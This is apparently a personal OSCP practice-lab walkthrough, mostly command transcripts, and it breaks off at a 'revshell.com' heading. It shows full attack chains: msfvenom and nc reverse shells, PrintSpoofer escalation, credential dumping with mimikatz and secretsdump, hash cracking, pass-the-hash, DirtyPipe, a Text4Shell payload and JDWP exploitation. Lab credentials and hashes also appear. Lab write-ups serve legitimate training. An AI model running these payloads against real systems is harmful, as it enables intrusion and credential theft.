## Challenge 5 OSCP B

### 192.168.60.147
```
$ nmap -sC -sV 192.168.60.147

PORT     STATE SERVICE        VERSION
21/tcp   open  ftp            Microsoft ftpd
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http           Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: TRACE
8080/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp open  ssl/https-alt?
```
```
$ evil-winrm -i 192.168.60.147 -u 'Eric.Wallows' -p 'EricLikesRunning800'
                                        
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled
*Evil-WinRM* PS C:\Users\eric.wallows\Documents>
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> ps | findstr spoolsv
    436      20     5160      14748              2156   0 spoolsv
```
#### 工具
[https://github.com/int0x33/nc.exe/tree/master]
[https://github.com/itm4n/PrintSpoofer/releases]
[https://github.com/nicocha30/ligolo-ng/releases/tag/v0.9]
```
$ unzip ligolo-ng_agent_0.9_windows_amd64.zip
$ tar -xvf ligolo-ng_proxy_0.9_linux_amd64.tar.gz 
```
```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.80.50 LPORT=9911 -f exe -o payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe
```
```
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload ~/Downloads/PrintSpoofer64.exe
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload ~/Downloads/nc64.exe
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload payload.exe
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload ~/Downloads/agent.exe
```
#### 执行
```
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> whoami
oscp\eric.wallows

*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\PrintSpoofer64.exe -c "nc64.exe 192.168.49.60 9999 -e powershell"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```
### 10.10.80.147 -MS01
```
$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.49.60] from (UNKNOWN) [192.168.60.147] 65293

PS C:\Windows\system32> whoami
whoami
nt authority\system

PS C:\Users> net localgroup Administrators Eric.Wallows /add
net localgroup Administrators Eric.Wallows /add
The command completed successfully.
```
```
$ nxc smb 192.168.60.147 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
SMB         192.168.60.147  445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         192.168.60.147  445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
LSASSY      192.168.60.147  445    MS01             Saved 14 Kerberos ticket(s) to /home/kali/.nxc/modules/lsassy
LSASSY      192.168.60.147  445    MS01             MS01\Administrator 3c4495bbd678fac8c9d218be4f2bbc7b 
```
#### impacket-secretsdump 
```
$ impacket-secretsdump oscp.exam/Eric.Wallows:"EricLikesRunning800"@192.168.63.147

Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
```
```
$ vi hashes.txt
$ cp /usr/share/wordlists/rockyou.txt.gz .
$ gunzip rockyou.txt.gz 
$ hashcat -m 1000 hashes.txt rockyou.txt --quiet
31d6cfe0d16ae931b73c59d7e0c089c0:
d9358122015c5b159574a88b3c0d2071:Freedom1
3c4495bbd678fac8c9d218be4f2bbc7b:December31
```
##### 内部代理
```
# sudo ./proxy -selfcert
```
```
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\agent.exe -connect 192.168.49.63:11601 -ignore-cert
agent.exe : time="2026-07-25T00:11:29-07:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-07-2...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-07-25T00:11:29-07:00" level=info msg="Connection established" addr="192.168.49.63:11601"
```
```
ligolo-ng » session
? Specify a session : 1 - OSCP\eric.wallows@MS01 - 192.168.63.147:56854 - 005056869d67
[Agent : OSCP\eric.wallows@MS01] » interface_create --name ligolo
INFO[0309] Creating a new ligolo interface...           
INFO[0309] Interface created!                           
[Agent : OSCP\eric.wallows@MS01] » start
INFO[0319] Starting tunnel to OSCP\eric.wallows@MS01 (005056869d67) 
[Agent : OSCP\eric.wallows@MS01] » route_add --name ligolo --route 10.10.23.0/24
INFO[0364] Route created.
[Agent : OSCP\eric.wallows@MS01] »
```
### 10.10.23.148
```
$ nmap -sV 10.10.23.148

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
#### impacket-GetUserSPNs
```
$ impacket-GetUserSPNs -request -dc-ip 10.10.23.146 oscp.exam/eric.wallows
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------  --------  --------------------------  --------------------------  ----------
MSSQL/MS02.oscp.exam  sql_svc            2022-11-10 08:03:18.456165  2022-11-10 11:15:51.783016             
HTTP/MS01.oscp.exam   web_svc            2022-11-11 07:11:19.795439  2022-12-01 11:08:56.803710             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$9f...
$krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$96...
```
```
$ vi spn_hash.hash
                                                                                                          
$ hashcat -m 13100 spn_hash.hash rockyou.txt --quiet
$krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$96...:Diamond1
$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$9f...:Dolphin1
```
#### impacket-mssqlclient
```
$ impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.23.148 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (OSCP\sql_svc  dbo@master)> 
```
#### MS02 MSSQL
```
SQL (OSCP\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1; -- priv
INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\sql_svc  dbo@master)> RECONFIGURE;
SQL (OSCP\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
mSQL (OSCP\sql_svc  dbo@master)> RECONFIGURE;
```
```
SQL (OSCP\sql_svc  dbo@master)> EXEC xp_cmdshell 'whoami /priv'
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeShutdownPrivilege           Shut down the system                      Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeUndockPrivilege             Remove computer from docking station      Disabled   
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
SeTimeZonePrivilege           Change the time zone                      Disabled   
NULL                                                                               
SQL (OSCP\sql_svc  dbo@master)>
```
#### 二段代理
##### [1]payload.exe 指向kali本地的9911端口，在MS01使用nc连接的10.10.80.147执行payload.exe
```
PS C:\Users\eric.wallows\Documents> ./payload.exe
./payload.exe
```
##### [2]直接连接了kali本地，这一步很重要，kali IP:192.168.49.60
```
$ nc -lvnp 9911
listening on [any] 9911 ...
connect to [192.168.49.60] from (UNKNOWN) [192.168.60.147] 63842
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Users\eric.wallows\Documents>whoami
whoami
nt authority\system

PS C:\Users\eric.wallows\Documents> ipconfig
Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.60.147
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.60.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.20.147
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
```
##### [3]内部代理执行本地端口代理，内部MS02 - MS01 - kali
```
[Agent : OSCP\eric.wallows@MS01] » listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999
INFO[0756] Listener 0 created on remote agent!          
[Agent : OSCP\eric.wallows@MS01] » listener_list
OSCP\eric.wallows@MS01 - 192.168.60.147:63833
```
##### [4]侦听MS01，上传工具，给 内部MS02 数据库使用的
```
$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42230
GET /PrintSpoofer64.exe HTTP/1.1
Host: 10.10.20.147:9999
User-Agent: curl/7.79.1
Accept: */*

$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
127.0.0.1 - - [28/Jul/2026 03:43:54] "GET /PrintSpoofer64.exe HTTP/1.1" 200 -
127.0.0.1 - - [28/Jul/2026 03:44:42] "GET /nc64.exe HTTP/1.1" 200 -
```
##### [5]curl.exe是windows自带的，kali本地开启http.server 9999端口，MSSQL下载工具：PrintSpoofer64.exe、nc64.exe
```
SQL (OSCP\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c "curl.exe http://10.10.20.147:9999/PrintSpoofer64.exe -o C:\Users\Public\PrintSpoofer64.exe';
output                                                                                                                                                           
--------------------------------------------------------------------------------------------------------------------------------------------------------------   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                  
                                 Dload  Upload   Total   Spent    Left  Speed                                                                                    
100 27136  100 27136    0     0  1528k      0 --:--:-- --:--:-- --:--:-- 1558k   
NULL                                                                                                                                                             
SQL (OSCP\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c "curl.exe http://10.10.20.147:9999/nc64.exe -o C:\Users\Public\nc64.exe';
output                                                                                                                                                           
--------------------------------------------------------------------------------------------------------------------------------------------------------------   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                  
                                 Dload  Upload   Total   Spent    Left  Speed                                                                                    
100 45272  100 45272    0     0  10.1M      0 --:--:-- --:--:-- --:--:-- 14.3M   
NULL                                                                                                                                                            
```
##### [6]开启监听 MS02
```
$ nc -lvnp 9999
listening on [any] 9999 ...
```
##### [7]MSSQL 反向连接
```
SQL (OSCP\sql_svc  dbo@master)> EXEC xp_cmdshell 'C:\Users\Public\PrintSpoofer64.exe -c "nc64.exe 10.10.20.147 9999 -e powershell"';
output                                        
-------------------------------------------   
[+] Found privilege: SeImpersonatePrivilege   
[+] Named pipe listening...                   
[+] CreateProcessAsUser() OK                  
NULL                                     
```
##### [8]成功在kali反向连接到MS02
```
$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60998
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> hostname
hostname
MS02

PS C:\Windows\system32>
```
##### [9]【这一步不需要执行】使用工具mimikatz.exe,如果是上传到Eric.Wallows,那么也会在MS01存在;
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```
```
PS C:\Users\Administrator\Desktop> hostname
hostname
MS01

PS C:\Users\Administrator\Desktop> dir
dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/27/2026   8:59 PM        1355264 mimikatz.exe     
```
##### [10]nc的MS02,需要使用curl通过agent的9999端，获取kali本地的工具
```
PS C:\users\Administrator\Desktop> hostname
hostname
MS02
```
###### 在kali本地上开启http.server 9999端口，也只能开启9999端口，因为内部代理的就是9999端口
```
(kali?kali)-[/usr/share/windows-resources/mimikatz/x64]
$ python3 -m http.server 9999 
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
```
```
PS C:\users\Administrator\Desktop> curl http://10.10.20.147:9999/mimikatz.exe -o C:\Users\Administrator\Desktop\mimikatz.exe
```
##### 执行工具mimikatz.exe
```
PS C:\users\Administrator\Desktop> .\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
        
        kerberos :
         * Username : Administrator     
```
```
$ nxc smb 10.10.20.146 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
SMB         10.10.20.146    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.20.146    445    DC01             [+] oscp.exam\Administrator:59b280ba707d22e3ef0aa587fc29ffe5 (Pwn3d!)
```
##### Administrator在DC01
```
$ evil-winrm -i 10.10.32.146 -u 'Administrator' -H '59b280ba707d22e3ef0aa587fc29ffe5'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
oscp\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> hostname
DC01
```
### 192.168.162.149
```
$ nmap -sV -sC 192.168.72.149

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
##### SNMP
```
$ sudo nmap -sU --open -p 161 192.168.72.149

PORT    STATE SERVICE
161/udp open  snmp
```
##### 使用 hydra 找到 SNMP 团体字符串：public
```
$ hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.72.149
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-29 02:32:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://192.168.72.149:161/
[161][snmp] host: 192.168.72.149   password: public
[STATUS] attack finished for 192.168.72.149 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-29 02:32:59
```
##### NET-SNMP-EXTEND-MIB::nsExtendObjects -->1.3.6.1.4.1.8072.1.3
```
$ snmpwalk -v2c -c public 192.168.72.149 1.3.6.1.4.1.8072.1.3 
iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.2.5.82.69.83.69.84 = STRING: "./home/john/RESET_PASSWD"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.5.82.69.83.69.84 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.4.5.82.69.83.69.84 = ""
iso.3.6.1.4.1.8072.1.3.2.2.1.5.5.82.69.83.69.84 = INTEGER: 5
iso.3.6.1.4.1.8072.1.3.2.2.1.6.5.82.69.83.69.84 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.7.5.82.69.83.69.84 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.2.1.20.5.82.69.83.69.84 = INTEGER: 4
iso.3.6.1.4.1.8072.1.3.2.2.1.21.5.82.69.83.69.84 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.3.1.1.5.82.69.83.69.84 = STRING: "Resetting password of kiero to the default value"
iso.3.6.1.4.1.8072.1.3.2.3.1.2.5.82.69.83.69.84 = STRING: "Resetting password of kiero to the default value"
iso.3.6.1.4.1.8072.1.3.2.3.1.3.5.82.69.83.69.84 = INTEGER: 1
iso.3.6.1.4.1.8072.1.3.2.3.1.4.5.82.69.83.69.84 = INTEGER: 0
iso.3.6.1.4.1.8072.1.3.2.4.1.2.5.82.69.83.69.84.1 = STRING: "Resetting password of kiero to the default value"
```
##### "Resetting password of kiero to the default value"
```
$ ftp 192.168.72.149 

ftp> ls

-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2

ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||10093|)
150 Opening BINARY mode data connection for id_rsa (2590 bytes).
100% |*************************************************************|  2590        6.72 MiB/s    00:00 ETA
226 Transfer complete.
2590 bytes received in 00:00 (2.82 MiB/s)
ftp> quit
221 Goodbye.
```
```
$ chmod 600 id_rsa

$ ssh john@192.168.72.149 -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
john@oscp:~$ ls
RESET_PASSWD  local.txt
john@oscp:~$ cat local.txt
```
### Privilege Escalation
```
[/usr/share/peass/linpeas]$ python3 -m http.server 8011
Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
192.168.72.149 - - [29/Jul/2026 02:56:50] "GET /linpeas.sh HTTP/1.1" 200 -
```
```
john@oscp:~$ wget http://192.168.49.72:8011/linpeas.sh

john@oscp:~$ chmod +x linpeas.sh
john@oscp:~$ ./linpeas.sh
```
##### john:public
```
??? Matched CVEs                                                                                          
CVE-2021-3490                  eBPF ALU32 bounds tracking for bitwise ops                                 
CVE-2021-3493                  Ubuntu OverlayFS
CVE-2021-22555                 Netfilter heap out-of-bounds write
CVE-2022-0847                  DirtyPipe
CVE-2022-0995                  watch_queue
CVE-2022-32250                 nft_object UAF (NFT_MSG_NEWSET)
```
##### linpeas.sh 找到了 CVE-2022-0847 DirtyPipe
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
```
john@oscp:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git

john@oscp:~$ cd CVE-2022-0847-DirtyPipe-Exploits

john@oscp:~/CVE-2022-0847-DirtyPipe-Exploits$ ls
README.md  compile.sh  exploit-1.c  exploit-2.c

john@oscp:~/CVE-2022-0847-DirtyPipe-Exploits$ chmod 777 compile.sh

john@oscp:~/CVE-2022-0847-DirtyPipe-Exploits$ ./compile.sh
john@oscp:~/CVE-2022-0847-DirtyPipe-Exploits$ ll
total 76
drwxr-xr-x 3 john john  4096 Jul 29 03:23 ./
drwxr-xr-x 7 john john  4096 Jul 29 03:20 ../
drwxr-xr-x 8 john john  4096 Jul 29 03:20 .git/
-rw-r--r-- 1 john john  2937 Jul 29 03:20 README.md
-rwxrwxrwx 1 john john    71 Jul 29 03:20 compile.sh*
-rwxr-xr-x 1 john john 17624 Jul 29 03:23 exploit-1*
-rw-r--r-- 1 john john  5364 Jul 29 03:20 exploit-1.c
-rwxr-xr-x 1 john john 18040 Jul 29 03:23 exploit-2*
-rw-r--r-- 1 john john  7752 Jul 29 03:20 exploit-2.c

john@oscp:~/CVE-2022-0847-DirtyPipe-Exploits$ ./exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id
uid=0(root) gid=0(root) groups=0(root)
ls
proof.txt  snap
cat proof.txt
```
### 192.168.72.150
```
$ nmap -sC -sV 192.168.72.150             

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Spring Java Framework
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
##### 枚举8080目录
```
$ gobuster dir -u http://192.168.72.150:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100

search               (Status: 200) [Size: 25]
error                (Status: 500) [Size: 105]
CHANGELOG            (Status: 200) [Size: 194]
```
##### 出来的信息
```
$ curl http://192.168.72.150:8080/CHANGELOG   
# Changelog

Version 0.2
- Added Apache Commons Text 1.8 Dependency for String Interpolation

Version 0.1
- Initial beta version based on Spring Boot Framework
- Added basic search functionality
```
##### Apache Commons Text 1.8
https://github.com/sunnyvale-it/CVE-2022-42889-PoC
```
## 页面给出的漏洞应用为：
$ curl http://localhost:8080/text4shell/attack\?search\=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Fp0wned%27%29%7D
Search results for: ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/p0wned')}%
```
##### %24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27
```
$ curl http://192.168.72.150:8080/search   
{"query":"*","result":""}  
```
##### nc反向连接
```
$ curl http://192.168.72.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox%20nc%20192.168.49.72%204444%20-e%20sh%27%29%7D%25

{"query":"${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.49.72 4444 -e sh')}%","result":""
```
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.49.72] from (UNKNOWN) [192.168.72.150] 46946

id
uid=1001(dev) gid=1001(dev) groups=1001(dev)

python3 -c 'import pty;pty.spawn("/bin/bash")'
dev@oscp:/dev$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                          
???(kali?kali)-[~]
??$ stty raw -echo ;fg               
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm
dev@oscp:/dev$

dev@oscp:/dev$ 
dev@oscp:/dev$ cd ~
dev@oscp:~$ ls
local.txt
dev@oscp:~$ cat local.txt
```
### Privilege Escalation
##### 这是在执行了linpeas.sh之后的发现的8000端口执行root,[有个问题,需要复制粘贴才能发现8000]
```
root         853  0.0  1.7 2528964 34956 ?       Ssl  01:46   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
```
##### 搜索‘jdwp exploit’ --> https://www.exploit-db.com/exploits/46501
##### 另外的搜索方法：jdwp(5000)但又8000端口
```
$ searchsploit jdwp   
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Java Debug Wire Protocol (JDWP) - Remote Code Execution                 | java/remote/46501.py
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
##### 下载
```
$ searchsploit -m java/remote/46501.py
```
##### [1]本地端口代理
```
dev@oscp:~$ ssh -f  -N -R 8000:localhost:8000 kali@192.168.49.66
kali@192.168.49.66's password: 
dev@oscp:~$ 
```
##### [2]
```
$ nc  -lvnp 9011
listening on [any] 9011 ...
```
##### [3]在kali上$操作
```
$ cat ex.sh                                   
curl http://192.168.66.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox%20nc%20192.168.49.66%204444%20-e%20sh%27%29%7D%25

$ chmod +x ex.sh

$ ./ex.sh       
{"query":"${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.49.66 4444 -e sh')}%","result":""}

$ python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc 192.168.49.66 9011 -e sh'
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
[+] Found Runtime class: id=84e
[+] Found Runtime.getRuntime(): id=7f8ecc02e0a8
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
```
##### [5]POC执行完毕后，验证了5000端口已打开，并连接到该端口以触发事件
```
dev@oscp:/$ ss -nltp
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                        
LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                  
LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                  
LISTEN 0      50                 *:5000            *:*                                  
LISTEN 0      100                *:8080            *:*    users:(("java",pid=836,fd=11))
LISTEN 0      128             [::]:22           [::]:*

dev@oscp:~$ nc 127.0.0.1 5000
Available Processors: 1
Free Memory: 26502592
Total Memory: 32440320
```
```
$ nc  -lvnp 9011
listening on [any] 9011 ...

connect to [192.168.49.66] from (UNKNOWN) [192.168.66.150] 52160

whoami
root
id
uid=0(root) gid=0(root)
cd /root
cat proof.txt
```
##### nice!结果
```
$ python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc 192.168.49.66 9011 -e sh'
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
[+] Found Runtime class: id=84e
[+] Found Runtime.getRuntime(): id=7f8ecc02e0a8
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
[+] Received matching event from thread 0x8ea
[+] Selected payload 'busybox nc 192.168.49.66 9011 -e sh'
[+] Command string object created id:8eb
[+] Runtime.getRuntime() returned context id:0x8ec
[+] found Runtime.exec(): id=7f8ecc02e0e0
[+] Runtime.exec() successful, retId=8ed
[!] Command successfully executed
```
### 192.168.56.151
```
$ nmap -sC -sV 192.168.56.151

PORT     STATE SERVICE          VERSION
80/tcp   open  http             Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```
##### 搜索‘8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket’ 
https://www.exploit-db.com/exploits/47799
```
$ searchsploit FreeSWITCH                                                 
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                   | windows/remote/47799.txt
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

$ searchsploit -m 47799  
```
##### 执行payload
```
$ python 47799.txt 192.168.56.151 whoami
Authenticated
Content-Type: api/response
Content-Length: 11

oscp\chris
```
###### revshell.com
```
